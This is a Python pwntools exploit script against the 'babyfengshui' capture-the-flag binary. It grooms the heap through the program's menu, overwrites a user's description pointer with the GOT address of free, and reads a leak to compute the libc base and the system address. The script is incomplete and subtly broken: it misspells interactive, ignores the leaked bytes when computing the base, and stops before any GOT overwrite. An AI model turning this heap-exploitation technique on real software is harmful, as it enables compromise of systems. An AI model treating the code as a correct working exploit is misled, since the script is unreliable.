#!/usr/bin/env python3

from pwn import *

vuln = "./babyfengshui"
io = process(vuln)

def useradd(desc_sz,name,desc):
    io.recvuntil(b"Action: ")
    io.sendline(b"0")
    io.recvuntil(b"size of description: ")
    io.sendline(str(desc_sz).encode())
    io.recvuntil(b"name: ")
    io.sendline(name.encode())
    io.recvuntil(b"text length: ")
    io.sendline(str(len(desc)).encode())
    io.recvuntil(b"text: ")
    io.sendline(str(desc).encode())

def rmuser(i):
    io.recvuntil(b"Action:")
    io.sendline(b"1")
    io.recvuntil(b"index:")
    io.sendline(str(i).encode())

def display(i):
    io.recvuntil(b"Action:")
    io.sendline(b"2")
    io.recvuntil(b"index:")
    io.sendline(str(i).encode())
    io.recvuntil(b"name:")
    name = io.recvline(False)
    io.recvuntil(b"description: ")
    io.interative()
    desc = io.recvline(False)
    return desc

libc = ELF('/lib32/libc.so.6')
system = libc.sym['system']
free = libc.sym['free']
gotfree = 0x804b010



payload = b""
payload += b"E"*140
payload += b"A"*20 # discription of user 1 = 10 + heap header 10 + inuse byte + 2
payload += p32(gotfree)

useradd(10,"A"*10,"A"*10) #user0
useradd(10,"B"*10,"B"*10) #user1

rmuser(0)
io.recvuntil(b"Action: ")
io.sendline(b"0")
io.recvuntil(b"size of description: ")
io.sendline(b"140")
io.recvuntil(b"name: ")
io.sendline(b"DDD")
io.recvuntil(b"text length: ")
io.sendline(str(len(payload)).encode())
io.recvuntil(b"text:")
io.sendline(payload)
io.recvuntil(b"Action: ")
io.sendline(b"2")
io.recvuntil(b"index: ")
io.sendline(b"1")
io.recvuntil(b"name:")
io.recvuntil(b"description: ")
leak = io.recv(4)

libcbase = gotfree - free
sys = libcbase + system
log.info("Libcbase: " + hex(libcbase))



io.interactive()
